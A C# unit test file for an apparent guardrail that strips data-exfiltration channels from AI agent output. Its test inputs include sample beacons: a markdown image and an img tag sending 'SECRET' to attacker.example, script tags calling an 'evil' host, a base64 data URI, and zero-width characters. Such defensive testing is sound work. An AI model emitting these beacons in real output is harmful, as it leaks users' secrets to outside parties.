// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors
// Licensed under the MIT License.

using AgentEval.Guardrails;
using AgentEval.Guardrails.Gates;
using Xunit;

namespace AgentEval.Tests.Guardrails;

/// <summary>Run-post output sanitizer: neutralizes rendered-exfil channels (markdown beacons, fetching HTML, data: URIs, zero-width).</summary>
public class RenderedOutputExfilGateTests
{
    private readonly RenderedOutputExfilGate _gate = new();

    [Fact]
    public async Task MarkdownImageBeacon_IsNeutralized()
    {
        var v = await _gate.InspectAsync("Here you go ![x](https://attacker.example/?d=SECRET) thanks");

        Assert.Equal(GateAction.Block, v.Action);
        Assert.Contains("markdown-image", v.Matches!);
        Assert.DoesNotContain("attacker.example", v.RedactedText!);
        Assert.Contains("[image removed]", v.RedactedText!);
    }

    [Fact]
    public async Task FetchingHtmlTag_IsNeutralized()
    {
        var v = await _gate.InspectAsync("<img src=\"https://attacker.example/pixel?d=SECRET\">");

        Assert.Equal(GateAction.Block, v.Action);
        Assert.Contains("fetching-html-tag", v.Matches!);
        Assert.DoesNotContain("attacker.example", v.RedactedText!);
    }

    [Fact]
    public async Task DataUri_IsNeutralized()
    {
        var v = await _gate.InspectAsync("payload: data:text/html;base64,PHNjcmlwdD4=");

        Assert.Equal(GateAction.Block, v.Action);
        Assert.Contains("data-uri", v.Matches!);
    }

    [Fact]
    public async Task ZeroWidthCharacters_AreStripped()
    {
        var zwsp = (char)0x200B;   // ZERO WIDTH SPACE — a covert channel
        var v = await _gate.InspectAsync($"visible{zwsp}hidden{zwsp}channel");

        Assert.Equal(GateAction.Block, v.Action);
        Assert.Contains("zero-width", v.Matches!);
        Assert.DoesNotContain(zwsp, v.RedactedText!);
        Assert.Equal("visiblehiddenchannel", v.RedactedText);
    }

    [Fact]
    public async Task CleanOutput_Allows()
    {
        var v = await _gate.InspectAsync("Your order #A-1001 shipped. See https://api.example.com/orders/A-1001 for details.");

        Assert.Equal(GateAction.Allow, v.Action);
    }

    [Fact]
    public async Task EmptyOutput_Allows()
    {
        Assert.Equal(GateAction.Allow, (await _gate.InspectAsync("")).Action);
    }

    [Fact]
    public async Task MultipleChannels_AllReported()
    {
        var v = await _gate.InspectAsync("![a](http://evil/x) and <script src=\"http://evil/y\"></script>");

        Assert.Equal(GateAction.Block, v.Action);
        Assert.Contains("markdown-image", v.Matches!);
        Assert.Contains("fetching-html-tag", v.Matches!);
    }
}
